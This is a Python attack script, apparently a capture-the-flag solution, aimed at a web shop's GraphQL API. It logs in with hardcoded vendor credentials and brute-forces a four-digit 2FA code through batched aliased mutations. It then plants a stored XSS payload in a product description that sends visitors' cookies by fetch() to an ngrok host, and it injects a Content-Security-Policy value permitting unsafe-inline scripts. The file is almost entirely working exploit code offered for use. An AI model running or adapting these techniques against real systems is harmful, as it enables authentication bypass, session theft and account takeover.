#!/usr/bin/env python3

import re
import requests
import sys
import time


def main():
    host = sys.argv[1]
    token = ''

    if len(sys.argv) == 3:
        token = sys.argv[2]

    s = requests.session()

    r = s.post(f'http://{host}/graphql',
            json={
                'query': 'mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }',
                'variables': {
                    'username': 'vendor53',
                    'password': 'PotionsFTW!'
                }
            }
        )

    while not token:
        for i in range(10):
            variables = {}
            query = 'mutation('

            for test_otp in range(i * 1000, (i + 1) * 1000):
                query += f'$o{test_otp:04d}:String!,'
                variables[f'o{test_otp:04d}'] = f'{test_otp:04d}'

            query = query[:-1] + '){'

            for test_otp in range(i * 1000, (i + 1) * 1000):
                query += f'o{test_otp:04d}:verify2FA(otp:$o{test_otp:04d}){{message,token}},'

            query += '}'

            r = s.post(f'http://{host}/graphql', json={"query": query, "variables": variables})

            if 'eyJ' in r.text:
                token = re.findall(r'"token":"(.*?)"', r.text)[0]
                break

            time.sleep(2)

    print(token)

    s.cookies.set('session', token)

    r = s.post(f'http://{host}/api/products/add', json={
        'product_name': 'asdf',
        'product_desc': '''<a id="potionTypes"></a><img id="1" name="potionTypes" src="cid:x\\' onerror='fetch(`http://abcd-12-34-56-78.ngrok.io/`+document.cookie,{mode:`no-cors`})'">''',
        'product_price': '123',
        'product_category': '1',
        'product_keywords': 'asdf',
        'product_og_title': 'fdsa',
        'product_og_desc': '''script-src 'unsafe-inline' http://127.0.0.1/static/js/product.js http://127.0.0.1/static/js/jquery.min.js" http-equiv="Content-Security-Policy''',
    })

    print(r.text)


if __name__ == '__main__':
    main()
